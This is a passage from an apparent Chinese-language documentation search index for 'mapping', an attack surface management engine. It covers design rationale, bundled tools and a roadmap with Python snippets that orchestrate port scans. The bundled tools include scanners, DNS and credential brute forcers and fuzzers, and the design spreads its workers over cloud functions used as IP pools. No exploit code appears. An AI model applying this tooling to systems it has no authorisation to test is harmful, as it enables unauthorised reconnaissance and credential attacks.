</ul>"},{"location":"mapping/design/#\u8bef\u89e3","title":"\u8bef\u89e3","text":"<p>\u8bef\u89e31 \u5982\u4f55\u81ea\u52a8\u5316\u8fdb\u884c\u8d44\u4ea7\u53d1\u73b0?</p> <p>\u6700\u76f4\u89c2\u7684\u7406\u89e3\u5c31\u662f\u628a\u624b\u52a8\u7684\u7e41\u7410\u64cd\u4f5c\u81ea\u52a8\u505a\u4e00\u904d, \u90a3\u4e48\u5728\u5b9e\u73b0\u4e0a\u5c31\u8868\u73b0\u4e3a\u628a\u4e00\u5806\u624b\u52a8\u7ecf\u5e38\u7528\u7684\u5de5\u5177\u7f16\u6392\u6210\u5de5\u4f5c\u6d41(\u751a\u81f3\u66f4\u7b80\u5355, \u6ca1\u6709\u7f16\u6392, \u5404\u8dd1\u4e00\u904d). </p> <p>\u8fd9\u4e0d\u602a\u4ea7\u54c1\u7ecf\u7406, \u4e0d\u7ba1\u662f\u7ea2\u961f\u53cd\u9988\u7ed9\u4ed6\u4eec\u7684\u9700\u6c42\u53c8\u6216\u662f\u5ba2\u6237\u7684\u9700\u6c42\u90fd\u662f\u8fd9\u4e48\u63cf\u8ff0\u7684:</p> <p>\"\u80fd\u4e0d\u80fd\u5e2e\u7ea2\u961f\u4f1a\u505a\u7684\u4e8b\u60c5\u81ea\u52a8\u5316\u5b9e\u73b0, \u5e76\u5b9a\u671f\u8dd1, \u5b9e\u65f6\u8dd1\"</p> <p>\u90a3\u4e48\u4eceASM\u7684\u89d2\u5ea6\u51fa\u53d1, \u5e94\u8be5\u600e\u4e48\u5b9e\u73b0\u8fd9\u4e2a\u9700\u6c42\u5462\uff1f</p> <p>ASM\u80fd\u505a\u5230\u7684, \u5e94\u8be5\u662f\u4eba\u5de5\u4e0d\u613f\u610f\u505a\u7684\u4e8b\u60c5. \u5c31\u6bd4\u5982\u5728\u9690\u5f62\u8d44\u4ea7\u6536\u96c6\u4e0a, \u6700\u5e38\u89c1\u7684\u9690\u5f62\u8d44\u4ea7\u662f\u901a\u8fc7nginx\u53cd\u4ee3\u7684vhost/path. </p> <p>\u5728ASM\u4e4b\u524d\uff0c \u4eba\u5de5\u80fd\u505a\u7684\u662f\u62ff\u7740\u4e00\u4e2a\u5b57\u6bb5\u53bb\u7206\u7834\u4e00\u4e0bpath\u6216\u8005host, \u5f88\u5c11\u4f1a\u6709\u4eba\u5bf9\u6bcf\u4e2aweb\u90fd\u8fd9\u4e48\u505a, \u66f4\u5c11\u6709\u4eba\u5b9a\u5236\u5b57\u5178\u9488\u5bf9\u67d0\u4e2a\u76ee\u6807\u7684\u6240\u6709web\u8fd9\u4e48\u505a.</p> <p>ASM\u53ef\u4ee5\u6570\u636e\u6c47\u603b\u5206\u6790\u7684\uff0c\u53ef\u4ee5\u6839\u636e\u76ee\u6807\u7684\u6240\u6709\u4fe1\u606f, \u751f\u6210\u5b9a\u5236\u7684\u5b57\u5178, \u5bf9\u6240\u6709\u7684web\u7684path\u548chost\u8fdb\u884c\u7206\u7834.</p> <p>\u7c7b\u4f3c\u7684\u573a\u666f\u8fd8\u53ef\u4ee5\u7528\u5728\u5b50\u57df\u540d, \u5f31\u53e3\u4ee4, \u4f9b\u5e94\u94fe\u7b49\u7b49\u73af\u8282\u4e0a. </p> <p>\u5bf9\u5df2\u6709\u5de5\u5177\u8fdb\u884c\u7f16\u6392ASM\u6700\u57fa\u672c\u7684\u80fd\u529b, \u4e0d\u5e94\u8be5\u76f4\u63a5\u7406\u89e3\u4e3aASM\u5c31\u662f\u505a\u8fd9\u4e2a\u7684. </p> <p>\u8bef\u89e32 \u6536\u96c6\u5230\u7684\u8d44\u4ea7\u662f\u653b\u51fb\u9762\u4e48?</p> <p>\u628a\u5f00\u6e90\u7684\u4f18\u8d28\u5de5\u5177\u90fd\u8dd1\u4e00\u904d, \u6216\u591a\u6216\u5c11\u603b\u80fd\u6536\u96c6\u5230\u4e00\u5806\u4fe1\u606f, \u53ef\u80fd\u662fip,url,domain...... \u5404\u79cd\u5404\u6837\u683c\u5f0f\u7684. </p> <p>\u6700\u5e38\u89c1\u7684\u505a\u6cd5\u5c31\u662f\u5206\u7c7b\u5c55\u793a, \u5176\u4e2dip\u7ba1ip\u4e00\u4e2a\u51e0\u9762, url\u7ba1url\u4e00\u4e2a\u754c\u9762. \u7136\u540e\u544a\u8bc9\u7528\u6237, \u8fd9\u91cc\u7684\u6570\u636e\u90fd\u662f\u653b\u51fb\u9762, \u786e\u5b9e\u6ca1\u4ec0\u4e48\u4e0d\u5bf9. </p> <p>\u4f46\u6211\u5f88\u96be\u60f3\u8c61, \u8fd9\u6837\u7684\u5de5\u5177\u8981\u5982\u4f55\u53bb\u4f7f\u7528. \u5bf9\u7740\u8d44\u4ea7\u8868\u9664\u4e86\u77aa\u773c\u4f3c\u4e4e\u4e5f\u505a\u4e0d\u4e86\u66f4\u591a\u7684\u4e8b? (\u67d0\u4e9b\u5165\u9009Gather\u7684ASM\u4e5f\u5728\u8fd9\u4e48\u505a, \u5efa\u8bae\u627e\u4e2a\u63a5\u89e6\u8fc7\u81ea\u653b\u9632\u4e00\u7ebf\u7684\u5f53\u4ea7\u54c1\u7ecf\u7406)</p> <p>\u597d\u5728\u4e0d\u662f\u6240\u6709ASM\u90fd\u662f\u8fd9\u4e48\u5b9e\u73b0\u7684, \u4e0eASM/VM(\u6f0f\u6d1e\u7ba1\u7406)\u4f34\u751f\u7684\u6982\u5ff5\u53eb\u505a VPT(\u6f0f\u6d1e\u4f18\u5148\u7ea7), \u5927\u4f53\u5b9e\u73b0\u4e0a\u5c31\u662f\u6839\u636eCVSS, EPSS, CWE\u7b49\u5404\u79cd\u6f0f\u6d1e\u7684\u8bc4\u4f30\u7ef4\u5ea6\u5bf9\u6f0f\u6d1e\u8fdb\u884c\u7ba1\u7406, \u51b3\u5b9a\u662f\u5426\u9700\u8981\u4fee\u590d\u4e0e\u4fee\u590d\u4f18\u5148\u7ea7.  \u800c\u5bf9\u4e8e\u653b\u51fb\u9762\u6765\u8bf4, \u53d1\u751f\u6f0f\u6d1e\u4e4b\u524d, \u5e76\u6ca1\u6709\u73b0\u6210\u7684\u5404\u79cd\u53c2\u6570\u53bb\u5206\u7c7b\u548c\u6392\u5e8f\u653b\u51fb\u9762. \u90a3\u5e94\u8be5\u600e\u4e48\u505a? </p> <p>\u8fd9\u7c7b\u95ee\u9898, \u5927\u591a\u6570\u60c5\u51b5\u4e0b, \u5c31\u9700\u8981\u6253\u6807\u5458\u5bf9\u5404\u79cd\u6570\u636e\u8fdb\u884c\u6807\u8bb0\u4e86. \u4e8b\u5b9e\u4e5f\u662f\u5982\u6b64, \u5982\u679c\u8981\u7ed9\u5404\u79cd\u5404\u6837\u7684\u6570\u636e\u5b9e\u73b0\u7edf\u4e00\u7684\u5173\u6ce8\u4f18\u5148\u7ea7\u6392\u5e8f, \u5c31\u9700\u8981\u975e\u5e38\u591a\u7684\u524d\u7f6e\u77e5\u8bc6. \u4f8b\u5982\u8fd9\u4e2a\u653b\u51fb\u9762\u662f\u5426\u6709\u653b\u51fb\u8005\u5173\u6ce8\u7684\u4fe1\u606f(\u4f8b\u5982\u6307\u7eb9, \u4f9b\u5e94\u94fe, \u6570\u636e\u5173\u8054\u7b49).  </p> <p>\u8fd9\u4e9b\u6570\u636e\u5176\u5b9e\u5f88\u96be\u7528\u4f20\u7edf\u7684\u5173\u7cfb\u578b\u6570\u636e\u5e93\u53bb\u63cf\u8ff0, \u6211\u4eec\u572821\u5e74\u5c31\u610f\u8bc6\u5230\u8fd9\u4e00\u70b9, \u5728\u5f53\u65f6\u516c\u5f00\u7684\u84dd\u56fe\u4e2d\u63d0\u5230\u4e86neo4j \u56fe\u6570\u636e\u5e93.  \u6211\u4eec\u7528\u56fe\u53bb\u5206\u6790\u8d44\u4ea7\u95f4\u7684\u5173\u8054, \u5e76\u57fa\u4e8e\u653b\u51fb\u70b9\u7684\u5173\u6ce8\u70b9\u8fdb\u884c\u653b\u51fb\u9762\u4f18\u5148\u7ea7\u6392\u5e8f. </p> <p>ASM\u662f\u9700\u8981\u8fd0\u8425\u7684, \u7279\u522b\u662f\u9700\u8981\u6765\u81ea\u5bf9\u6297\u4e00\u7ebf\u7684\u4fe1\u606f. \u8d44\u4ea7\u8868\u4e0d\u5b8c\u5168\u4ee3\u8868\u653b\u51fb\u9762, \u6f0f\u6d1e\u4e5f\u4e0d\u4ee3\u8868\u653b\u51fb\u9762. ASM\u4e0d\u662f\u81ea\u52a8\u5316\u6f0f\u626b, \u81ea\u52a8\u5316\u6f0f\u626b\u4e5f\u4e0d\u662fASM.</p> <p>\u8bef\u89e33 \u5982\u4f55\u4f7f\u653b\u51fb\u9762\u7ba1\u7406</p> <p>\u5728\u6700\u521d\u59cb\u7684\u9700\u6c42\u4e2d, \u53ea\u662f\u60f3\u81ea\u52a8\u5316\u7684\u6a21\u62df\u653b\u51fb\u8005\u7684\u601d\u8def, \u8fdb\u884c\u81ea\u52a8\u5316\u8d44\u4ea7\u53d1\u73b0, \u6f0f\u6d1e\u63a2\u6d4b. \u518d\u662f\u53d1\u73b0\u9690\u5f62\u8d44\u4ea7, \u6570\u636e\u5206\u6790\u5e76\u5173\u8054\u6392\u5e8f.  \u8fd9\u90fd\u662fASM\u5f15\u64ce\u9700\u8981\u5b9e\u73b0\u7684, \u90a3ASM\u5e94\u8be5\u5982\u4f55\u63d0\u4f9b\u4e0e\u7528\u6237\u7684\u4ea4\u4e92\u5462?</p> <p>\u7edd\u5927\u591a\u6570ASM\u7684\u4ea7\u54c1\u5f62\u6001\u4e0a\u7684\u4ea4\u4e92\u903b\u8f91\u975e\u5e38\u7b80\u5355.  \u63d0\u4f9b\u4e86\u4e00\u4e2a\u53ef\u914d\u7f6e\u7684\u83dc\u5355\u63cf\u8ff0\u4efb\u52a1\u8f93\u5165, \u7136\u540e\u7b49\u5f85\u4efb\u52a1\u6267\u884c\u5b8c, \u53ef\u4ee5\u5728\u8d44\u4ea7\u8868\u4e2d\u67e5\u9605\u7ed3\u679c. \u4f7f\u7528\u8005\u662f\u4e0d\u80fd\u5e72\u6d89\u5f15\u64ce\u662f\u5982\u4f55\u8fdb\u884c\u7684, \u8fd9\u53ef\u80fd\u548c\u4ea7\u54c1\u7684\u76ee\u6807\u7528\u6237\u6709\u5173, \u5546\u4e1a\u5316\u5de5\u5177\u7684\u4f7f\u7528\u8005\u7684\u60f3\u6cd5\u662f\u4ed8\u8d39\u4e86\u5c31\u4e0d\u60f3\u64cd\u5fc3\u4e86.  \u4f46\u662f\u5bf9\u4e8e\u653b\u9632\u573a\u666f\u6216SRC\u573a\u666f, \u8fd9\u4e48\u505a\u4f3c\u4e4e\u5b8c\u5168\u4e0d\u80fd\u8986\u76d6\u9700\u6c42. </p> <p>\u4f8b\u5982\u7ea2\u961f\u5173\u6ce8\u70b9\u66f4\u591a\u5728\u6307\u7eb9\u548c\u4f9b\u5e94\u94fe\u4fe1\u606f, SRC\u5219\u53ef\u80fd\u662f\u81ea\u5df1\u72ec\u4e00\u65e0\u4e8c\u7684tricks. \u7528\u6237\u60f3\u6839\u636e\u81ea\u5df1\u7684\u4f7f\u7528\u573a\u666f, \u6bd4\u5982</p> <ul> <li>\u901a\u8fc7\u4e00\u4e9b\u5916\u90e8\u4fe1\u606f\u6e90\u83b7\u5f97\u4e86\u65b0\u7684\u4fe1\u606f, \u5982\u4f55\u4e0e\u5de5\u4f5c\u6d41\u4ea4\u4e92? </li> <li>\u662f\u5426\u80fd\u63a7\u5236\u67d0\u4e9b\u5de5\u4ef6\u72ec\u7acb\u8fd0\u884c?</li> <li>\u662f\u5426\u53ef\u4ee5\u6839\u636e\u5df2\u6709\u4fe1\u606f\u53bb\u624b\u52a8\u63a7\u5236ASM\u6267\u884c\u65b0\u7684\u4efb\u52a1? </li> <li>\u80fd\u5426\u901a\u8fc7\u89c4\u5219\u8fc7\u6ee4\u4e00\u4e9b\u8bef\u62a5?</li> </ul> <p>\u66f4\u5177\u4f53\u7684\u573a\u666f\u4f8b\u5982:</p> <ul> <li>\u5728\u4e00\u573aHW\u4e2d, \u65b0\u6316\u4e00\u4e2a0day, \u8fd9\u4e2a0day\u6709\u7279\u6b8a\u7684\u8def\u5f84\u548c\u6307\u7eb9, \u539f\u672c\u65e0\u6cd5\u8bc6\u522b. \u73b0\u5728\u9700\u8981\u5148\u5bf9\u5168\u90e8\u76ee\u6807\u7684\u5168\u90e8\u8d44\u4ea7\u8fdb\u884c\u8bc6\u522b, \u7136\u540e\u8fdb\u884c\u6d4b\u8bd5.</li> <li>\u67d0\u4e2a\u76ee\u6807\u5b58\u5728\u4e00\u4e2a\u914d\u7f6e\u4e60\u60ef, \u4f8b\u5982nginx\u5747\u5b58\u5728\u4e00\u4e2a\u9519\u8bef\u914d\u7f6e, \u5982\u4f55\u5bf9\u8fd9\u4e2a\u76ee\u6807\u7684\u5168\u90e8\u8d44\u4ea7\u8fdb\u884c\u4e00\u4e2a\u68c0\u6d4b?</li> </ul> <p>\u5728\u6211\u89c1\u8fc7\u7684\u6240\u6709ASM\u4e2d\u90fd\u65e0\u6cd5\u5b9e\u73b0. \u6bd5\u7adf\u76ee\u6807\u7528\u6237\u7fa4\u4f53\u4e0d\u540c, \u6709\u4e0d\u4e00\u6837\u7684\u8bbe\u8ba1\u903b\u8f91.  \u4f46\u5bf9\u4e8e\u5bf9\u80fd\u529b\u6709\u771f\u6b63\u8981\u6c42\u7684\u7528\u6237\u6765\u8bf4, \u53ef\u80fd\u5c31\u8981\u60f3\u529e\u6cd5\u81ea\u884c\u5b9e\u73b0\u4e86. </p>"},{"location":"mapping/design/#\u8bbe\u8ba1","title":"\u8bbe\u8ba1","text":""},{"location":"mapping/design/#\u5de5\u4ef6\u5316","title":"\u5de5\u4ef6\u5316","text":"<p>\u8fd1\u4e9b\u5e74\u6765, \u4f7f\u7528go/rust\u91cd\u5199\u4f20\u7edf\u7684\u5b89\u5168\u5de5\u5177\u662f\u5927\u52bf. go/rust\u5df2\u51fa\u8272\u7684\u5e76\u53d1\u6027\u80fd\u4e0e\u8de8\u5e73\u53f0\u652f\u6301\u80fd\u8ba9\u65b0\u624b\u8f7b\u677e\u5199\u51fa\u6bd4nmap\u6027\u80fd\u66f4\u597d\u7684\u5de5\u5177.  \u4e5f\u6709\u5341\u51e0\u5e74\u6765\u73af\u5883\u53d8\u5316\u5bfc\u81f4\u539f\u6709\u7684\u5de5\u5177\u5f88\u96be\u9002\u5e94\u73b0\u4ee3\u5316\u7684\u4f7f\u7528\u573a\u666f. \u73b0\u5728\u5e94\u8be5\u6ca1\u6709\u4eba\u7528nmap\u53bb\u8dd1web\u6307\u7eb9\u5427?</p> <p>\u5f53\u7136\u91cd\u5199\u7684\u5de5\u5177\u4e0d\u4e00\u5b9a\u662f\u5de5\u4ef6. \u5de5\u4ef6\u7684\u5b57\u9762\u610f\u8bc6\u9690\u542b\u4e86\u6807\u51c6\u5316. \u4e00\u4e2a\u6ee1\u8db3\u4e86\u67d0\u4e2a\u7ec6\u5206\u9886\u57df\u7edd\u5927\u90e8\u5206\u9700\u6c42\u7684\u5de5\u5177\u624d\u80fd\u88ab\u79f0\u4e4b\u4e3a\u5de5\u4ef6. \u8fd9\u91ccprojectdiscovery\u63d0\u4f9b\u4e86\u4e00\u7cfb\u5217\u7684\u6700\u4f73\u5b9e\u8df5(\u867d\u7136\u8fd1\u671f\u7684\u66f4\u65b0\u6709\u4e9b\u529f\u80fd\u8fc7\u4e8e\u81a8\u80c0). \u6211\u4eec\u4e5f\u53d1\u5e03\u4e86\u4e00\u4e9b\u5728\u7279\u5b9a\u9886\u57df\u8db3\u4ee5\u79f0\u4e4b\u4e3a\u5de5\u4ef6\u7684\u5de5\u5177, gogo(\u7aef\u53e3\u626b\u63cf)/zombie(\u51ed\u8bc1\u7206\u7834)/spray (HTTP fuzz).</p> <p>mapping\u7684v0.0.1\u7248\u672c\u4e3b\u8981\u5173\u6ce8\u5916\u90e8\u653b\u51fb\u9762, \u7b2c\u4e00\u6279\u5f15\u5165\u7684\u5de5\u4ef6\u6709:</p> <ul> <li>asnmap, \u89e3\u6790asn</li> <li>nali, \u89e3\u6790ip\u5f52\u5c5e</li> <li>mapcidr, ip\u5de5\u5177\u96c6\u5408</li> <li>cdnchecker, \u5224\u65adcdn, \u4e91, \u4e91waf</li> <li>company, \u5de5\u5546\u4fe1\u606f\u722c\u866b</li> <li>dnsx, dns\u4fe1\u606f\u6536\u96c6</li> <li>gogo, \u7aef\u53e3\u626b\u63cf, \u6307\u7eb9\u8bc6\u522b </li> <li>httpx, http\u534f\u8bae\u57fa\u672c\u4fe1\u606f, </li> <li>naabu, \u7aef\u53e3\u9884\u63a2\u6d4b</li> <li>nuclei, \u6f0f\u626b</li> <li>searcher, \u7a7a\u95f4\u641c\u7d22\u5f15\u64ce\u4ea4\u53c9\u722c\u866b</li> <li>shuffledns, dns\u7206\u7834</li> <li>spray, http fuzzer</li> <li>subfinder, \u5b50\u57df\u540d\u6536\u96c6</li> <li>urlfounder, \u88ab\u52a8url\u6536\u96c6, </li> <li>zombie, \u51ed\u8bc1\u7206\u7834</li> </ul> <p>\u8fd9\u4e9b\u5de5\u4ef6\u57fa\u672c\u8986\u76d6\u7edd\u5927\u90e8\u5206\u5de5\u4f5c\u573a\u666f. ASM\u5f15\u64ce\u672c\u4f53\u4e0d\u4f1a\u4e0e\u76ee\u6807\u53d1\u751f\u4efb\u4f55\u63a5\u89e6. </p>"},{"location":"mapping/design/#etl-\u4e0e-\u7f16\u6392","title":"ETL \u4e0e \u7f16\u6392","text":""},{"location":"mapping/design/#\u53ef\u7f16\u6392","title":"\u53ef\u7f16\u6392","text":"<p>\u968f\u7740\u5404\u7c7b\u57fa\u7840\u8bbe\u65bd, \u5c24\u5176\u662fCloud Native\u751f\u6001\u7684\u84ec\u52c3\u53d1\u5c55, \u89e3\u51b3\u95ee\u9898\u7684\u65b9\u5f0f\u4ece\u9020\u8f6e\u5b50\u53d8\u6210\u4e86\u5c06\u4e00\u5806\u8f6e\u5b50\u642d\u5efa\u8d77\u6765. </p> <p>\u4f8b\u5982RPA(\u673a\u5668\u4eba\u81ea\u52a8\u5316\u6d41\u7a0b), SOAR(\u5b89\u5168\u7f16\u6392\u4e0e\u81ea\u52a8\u5316\u54cd\u5e94), BAS(\u5165\u4fb5\u548c\u653b\u51fb\u6a21\u62df), CI/CD(\u6301\u7eed\u96c6\u6210/\u6301\u7eed\u90e8\u7f72)\u7b49\u7b49\u9886\u57df. \u8fd9\u4e9b\u9886\u57df\u90fd\u6709\u7740\u76f8\u540c\u7684\u5185\u6838, \u5373\u53ef\u7f16\u6392\u6027, \u5373\u5bf9\u5e94\u7528\u7684\u81ea\u52a8\u5316\u914d\u7f6e, \u7ba1\u7406, \u8c03\u5ea6.</p> <p>\u540c\u65f6\u4e5f\u8bde\u751f\u4e86\u4e00\u4e9b\u7528\u4e8e\u7f16\u6392\u7684\u73b0\u4ee3\u5316\u5de5\u4f5c\u6d41\u5f15\u64ce, \u4f8b\u5982</p> <ul> <li>argo workflow https://github.com/leveryd-asm/asm \u548c https://trickest.com/news/introducing-new-workflow-execution-engine/ \u5c31\u662f\u57fa\u4e8e\u8fd9\u4e2a\u5de5\u4f5c\u6d41\u5f15\u64ce\u5b9e\u73b0\u7684\u4efb\u52a1\u7f16\u6392, argo\u8fd8\u63d0\u4f9b\u4e86\u56fe\u5f62\u5316\u62d6\u62fd\u5b9e\u73b0\u7684\u7f16\u6392). </li> <li>temporal, \u57fa\u4e8ego\u5b9e\u73b0\u7684\u73b0\u4ee3\u5316\u5de5\u4f5c\u6d41\u5f15\u64ce, \u6027\u80fd\u5e94\u8be5\u662f\u6700\u597d\u7684\u4e4b\u4e00</li> <li>prefect \u4e0epython\u8bed\u6cd5\u7279\u6027\u878d\u5408\u5f97\u6bd4\u8f83\u597d\u7684\u5de5\u4f5c\u6d41\u5f15\u64ce. mapping\u5c31\u91c7\u7528\u4e86\u8fd9\u4e2a, \u4f46\u5b9e\u9645\u4e0a\u6ca1\u7528\u5230prefect\u591a\u5c11\u672c\u8eab\u7684\u7279\u6027, ASM\u573a\u666f\u5bf9\u4e8e\u5de5\u4f5c\u6d41\u5f15\u64ce\u6765\u8bf4\u662f\u6bd4\u8f83\u7279\u6b8a\u7684, \u8bb8\u591a\u7279\u6027\u9700\u8981\u81ea\u884c\u5b9e\u73b0. </li> </ul> <p>\u8981\u5b9e\u73b0ASM\u7684\u81ea\u52a8\u5316/\u534a\u81ea\u52a8\u5316, \u9996\u5148\u5f97\u5c06\u6211\u4eec\u7684\u57fa\u672c\u7ec4\u4ef6\u7f16\u6392\u8d77\u6765. \u4f7f\u5176\u4e0d\u518d\u662f\u96f6\u6563\u7684\u5de5\u5177, \u800c\u662f\u4e92\u76f8\u6709\u4ea4\u4e92.</p>"},{"location":"mapping/design/#etl","title":"ETL","text":"<p>ETL(Extract-Transform-Load) \u548c\u53cd\u5411ETL(Reverse Extract-Transform-Load). \u662f\u5de5\u4f5c\u6d41\u5f15\u64ce\u6700\u5e38\u89c1\u7684\u5e94\u7528. ASM\u9996\u5148\u8981\u5b9e\u73b0\u5de5\u4ef6\u7684\u7f16\u6392, \u7136\u540e\u5c31\u9700\u8981\u5c06\u5176\u62bd\u8c61\u4e3a\u4e00\u4e2a\u4e00\u4e2aETL\u5355\u5143.  </p> <p>\u7f16\u6392\u4e3b\u8981\u5173\u6ce8artifact\u4e4b\u95f4\u7684\u6267\u884c\u5de5\u4f5c\u6d41, \u800cETL\u5173\u6ce8\u70b9\u5728\u4e8e\u6570\u636e\u6d41. ASM\u5e94\u8be5\u80fd\u63d0\u4f9b\u63a5\u53e3\u6ee1\u8db3\u5404\u79cd\u5404\u6837\u7684\u6570\u636e\u4ea4\u4e92\u9700\u6c42. \u5e76\u4e14\u80fd\u591f\u4ece\u6570\u636e\u4e2d\u5206\u6790\u51fa\u65b0\u7684\u4fe1\u606f. </p> <p>\u9759\u6001\u7684\u8d44\u4ea7\u8868\u662f\u5b8c\u5168\u65e0\u6cd5\u6ee1\u8db3\u590d\u6742\u9700\u6c42\u7684. </p>"},{"location":"mapping/design/#\u5206\u5e03\u5f0f\u4e0e\u90e8\u7f72","title":"\u5206\u5e03\u5f0f\u4e0e\u90e8\u7f72","text":"<p>\u5206\u5e03\u5f0f\u5bf9\u4e8e\u73b0\u4ee3\u5316\u5de5\u5177\u6765\u8bf4\u662f\u523b\u5728\u9aa8\u5b50\u91cc\u7684, \u7279\u522b\u662fASM\u8fd9\u7c7b\u5de5\u5177\u6765\u8bf4, \u7528\u4ee3\u7406\u6c60\u6216\u8005IP\u6c60\u90fd\u4e0d\u80fd\u6ee1\u8db3\u5982\u6b64\u5de8\u5927\u7684\u5e76\u53d1. \u4ee3\u7406\u662f\u4e00\u4e2a\u5f88\u4e0d\u7a33\u5b9a\u7684\u56e0\u7d20, \u4f1a\u6781\u5927\u5f71\u54cd\u7ed3\u679c. \u53ea\u6709\u5c06\u539f\u751f\u7684artifact(\u6216\u8005\u62bd\u8c61\u4e3aworker) \u5206\u5e03\u5f0f\u90e8\u7f72, \u624d\u80fd\u5b9e\u73b0\u5404\u79cd\u590d\u6742\u7684\u8c03\u5ea6. </p> <p>mapping\u4ece\u8bbe\u8ba1\u4e4b\u521d\u5c31\u4f9d\u8d56meta-matrix \u9879\u76ee. \u8fd9\u662f\u4e00\u4e2a\u4e91\u51fd\u6570\u6846\u67b6, \u80fd\u5c06\u4e8c\u8fdb\u5236\u6587\u4ef6\u4e00\u952e\u90e8\u7f72\u4e0d\u540c\u670d\u52a1\u5546\u4e0d\u540c\u5730\u533a\u7684\u7684\u4e91\u51fd\u6570\u4e2d\u53bb. \u901a\u8fc7\u4e91\u51fd\u6570\u7684\u52a8\u6001\u4f38\u7f29\u6269\u5bb9\u5b9e\u73b0ip\u6c60,\u8d44\u6e90\u6c60. terraform\u7ed9\u6211\u4eec\u63d0\u4f9b\u4e86\u4f18\u96c5\u7684\u8de8\u4e91\u670d\u52a1\u5546\u7684IaaS\u57fa\u7840\u80fd\u529b. terragrunt\u5219\u63d0\u4f9b\u4e86\u591a\u670d\u52a1\u5546\u7684\u7ba1\u7406\u529f\u80fd. \u53ea\u9700\u8981\u4e00\u4e2a\u56de\u8f66, \u5c31\u80fd\u5c06\u6211\u4eec\u7684\u5de5\u4f5c\u8282\u70b9\u90e8\u7f72\u5230\u5168\u4e16\u754c\u5404\u5730. </p>"},{"location":"mapping/roadmap/","title":"Roadmap","text":"<p>\u539f\u6709\u7684ASM\u57fa\u4e8e\u5916\u7f51\u81ea\u52a8\u5316\u6e17\u900f\u7684\u601d\u8def\u5b9e\u73b0\u3002 \u56e0\u6b64infra\u5c42\uff0c\u57fa\u4e8e\u4e91\u51fd\u6570\u5b9e\u73b0\u3002\u5e76\u4e14\u5de5\u4f5c\u6d41\u5f15\u64ce\u7684\u8c03\u5ea6\u5668\u8bbe\u8ba1\u5b58\u5728\u4e0d\u5c11\u7f3a\u9677\uff0c\u4e0d\u591f\u5de5\u7a0b\u5316\uff0c \u5e94\u7528\u573a\u666f\u8fc7\u4e8e\u5355\u4e00\uff0c \u4f7f\u7528\u590d\u6742\u7684\u95ee\u9898\u3002</p>"},{"location":"mapping/roadmap/#stage-1","title":"stage 1","text":""},{"location":"mapping/roadmap/#\u91cd\u6784\u67b6\u6784","title":"\u91cd\u6784\u67b6\u6784","text":"<p>\u6574\u4f53\u67b6\u6784\u8fdb\u884c\u4e86\u5fae\u8c03\u3002 \u5206\u4e3a: </p> <ul> <li>\u57fa\u7840\u8bbe\u65bd\u5c42</li> <li>\u5206\u5e03\u5f0f\u8c03\u5ea6\u5c42</li> <li>\u6570\u636e\u5c42</li> </ul>"},{"location":"mapping/roadmap/#\u57fa\u7840\u8bbe\u65bd\u5c42","title":"\u57fa\u7840\u8bbe\u65bd\u5c42","text":"<p>\u57fa\u7840\u8bbe\u65bd\u5373 worker \u3002 \u539f\u672c\u7684worker\u53ea\u5728\u4e91\u51fd\u6570\u4e0e\u672c\u5730\u5de5\u4f5c\uff0c \u540e\u7eedworker\u5c06\u57fa\u4e8e\u4e0d\u540c\u7684\u5de5\u4f5c\u573a\u666f\u5b9e\u73b0\u3002</p> <p>worker\u4ee3\u8868\u7740\u8fd9\u5957\u7cfb\u7edf\u7684\u80fd\u529b\u8fb9\u754c\u3002technology \u548cpattern\u5c06\u5728\u8fd9\u4e2a\u5c42\u9762\u4e0a\u5b9e\u73b0\u3002 \u5bf9\u5e94\u4ee3\u7801\u4e2d\u7684task\u4e0eflow\u3002</p> <p>\u4f46\u662ftask\u548cflow\u8fd8\u4e0d\u662f\u771f\u6b63\u6700\u5e95\u5c42\u7684\u80fd\u529b\u63d0\u4f9b\u8005\u3002 \u53ea\u662f\u80fd\u529b\u7684\u4f7f\u7528\u8005\uff0c \u4ee5gogo\u4e3a\u4f8b</p> <pre><code>@task(name=\"gogo_cidr\")  \ndef gogo_cidr(cidr) -&gt; Result[GOGOData]:  \n    cmd = f\"-i {cidr} -p top2,win,db -Ojl -f gogo_vir_result.json\".split(\" \")  \n    stdout, data = get_engine().gogo.run(cmd, save=False)  \n    return data  \n\n\n@task(name=\"gogo_iplist\")  \nasync def gogo_iplist(iplist) -&gt; Result[GOGOData]:  \n    cmd = f\"-p top2,win,db -v -Ojl -f gogo_vir_result.json\".split(\" \")  \n    stdout, data = get_engine().gogo.run(cmd, body={\"-l\": \"\\n\".join(iplist).encode(\"utf-8\")}, save=False)  \n    return data  \n\n\n@artifact_flow(name=\"gogo\")  \nasync def gogo_flow(meta) -&gt; Result[GOGOData]:  \n    match meta.task_name:  \n        case \"gogo_iplist\":  \n            gogo_result = await gogo_iplist(meta.iplist)  \n        case _:  \n            gogo_result = await gogo_cidr(meta.cidr)  \n    return gogo_result\n</code></pre> <p>\u771f\u6b63\u7684\u5e95\u5c42\u80fd\u529b\u57fa\u4e8eengine\u5b9e\u73b0\u3002 \u6211\u4eec\u5c06\u63d0\u4f9b\u4e00\u4e2aworker\u5de5\u5382\uff0c \u57fa\u4e8e\u73b0\u6709\u7684\u914d\u7f6e\u7ec4\u88c5\u80fd\u529b\u3002 </p> <p>\u73b0\u5728\u7684\u5b9e\u73b0\u662f\u56fa\u5b9a\u5b9e\u73b0\uff0c \u8fd8\u4e0d\u662f\u5de5\u5382\u6a21\u5f0f\uff0c \u540e\u7eed\u5c06\u6539\u6210\u5de5\u5382\u6a21\u5f0f, worker \u5c06\u6839\u636e\u4e0d\u540c\u7684\u914d\u7f6e\u7ec4\u88c5\u3002</p> <p>\u5728\u547d\u540d\u4e0a engine\u53ef\u80fd\u9700\u8981\u4fee\u6539\u4e3aCapability</p> <pre><code>class Engine:  \n    config: EngineSettings  \n    serverless_engine: ServerlessEngine  \n    ina_engine: InaEngine  \n    company_engine: CompanyEngine  \n    local_engine: LocalEngine\n</code></pre> <p>\u4e3a\u4e86\u4fdd\u6301\u62bd\u8c61\u7684\u7edf\u4e00\u6027\uff0c \u6211\u4eec\u9700\u8981\u5c06\u5df2\u6709\u6570\u636e\u6e90\u83b7\u53d6\u6570\u636e\u4e5f\u5c01\u88c5\u4e3aCapability \u901a\u8fc7\u6d88\u606f\u961f\u5217\u83b7\u53d6\u548c\u63a8\u9001\u3002 \u800c\u4e0d\u662f\u5728\u8c03\u5ea6\u5c42\u76f4\u63a5\u83b7\u53d6\u6570\u636e\uff0c \u4fdd\u8bc1\u6bcf\u4e2aCapability\u7684\u539f\u5b50\u6027\u3002</p> <p>Capability 